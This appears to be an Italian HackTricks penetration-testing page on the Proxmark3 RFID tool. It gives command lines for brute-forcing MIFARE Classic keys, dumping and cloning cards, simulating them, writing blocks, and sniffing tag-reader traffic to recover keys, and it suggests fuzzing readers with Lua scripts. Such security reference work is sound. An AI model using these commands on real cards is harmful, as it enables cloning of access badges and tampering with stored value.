# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Attaccare i sistemi RFID con Proxmark3

Installa il client Proxmark3 RRG/Iceman mantenuto attivamente e il firmware corrispondente, quindi verifica la sintassi dei comandi con quella build, poiché i comandi meno recenti mostrati sotto potrebbero essere cambiati.<sup>[[1]](#references)[[5]](#references)</sup>

### Attaccare MIFARE Classic 1KB

MIFARE Classic 1K ha **16 settori**, ciascuno con **4 blocchi** da **16 byte**. Il blocco del produttore 0 contiene l'UID e i dati del produttore ed è di sola lettura sulle carte NXP originali; le carte clone speciali o “magic” potrebbero consentirne la riscrittura.<sup>[[1]](#references)[[2]](#references)</sup>\
Per accedere a ciascun settore servono **2 chiavi** (**A** e **B**), memorizzate nel **blocco 3 di ogni settore** (trailer del settore). Il trailer del settore memorizza anche i **bit di accesso**, che stabiliscono i permessi di **lettura e scrittura** per **ogni blocco** usando le 2 chiavi.\
Le 2 chiavi sono utili, ad esempio, per concedere i permessi di lettura se conosci la prima e quelli di scrittura se conosci la seconda.

È possibile eseguire diversi attacchi.

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Il Proxmark3 consente di eseguire altre azioni, come **intercettare** una **comunicazione Tag to Reader**, per cercare dati sensibili. Su questa tessera, puoi semplicemente sniffare la comunicazione e calcolare la chiave utilizzata, perché le **operazioni crittografiche impiegate sono deboli** e, conoscendo il testo in chiaro e quello cifrato, puoi calcolarla (strumento `mfkey64`).<sup>[[3]](#references)</sup>

#### Flusso di lavoro rapido per abusare del valore memorizzato su MiFare Classic

Per la sequenza di recupero della chiave, confronto dei saldi, verifica del campo di integrità e clonazione dell'UID, inclusi il transcript del client Proxmark3 e i limiti delle magic card, consulta [Manomissione offline del valore memorizzato su MiFare Classic](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1).

### Comandi raw

I sistemi IoT a volte usano **tag non brandizzati o non commerciali**. In questo caso, puoi usare Proxmark3 per inviare **comandi raw personalizzati ai tag**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Con queste informazioni potresti cercare informazioni sulla scheda e su come comunicare con essa. Proxmark3 consente di inviare comandi raw come: `hf 14a raw -p -b 7 26`

### Script

Il software Proxmark3 include un elenco preinstallato di **script di automazione** che puoi usare per eseguire attività semplici. Per visualizzare l’elenco completo, usa il comando `script list`. Poi usa il comando `script run`, seguito dal nome dello script:

```
proxmark3> script run mfkeys
```

Puoi creare uno script per **eseguire fuzzing sui lettori di tag**: copia i dati di una **carta valida**, scrivi semplicemente uno **script Lua** che **randomizzi** uno o più **byte** casuali e verifica se il **lettore va in crash** in una qualsiasi iterazione.

## References

- [1] [Wiki Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki Proxmark3: carte HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Dichiarazione NXP su MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Sfruttamento della vulnerabilità delle carte NFC in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — installazione Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
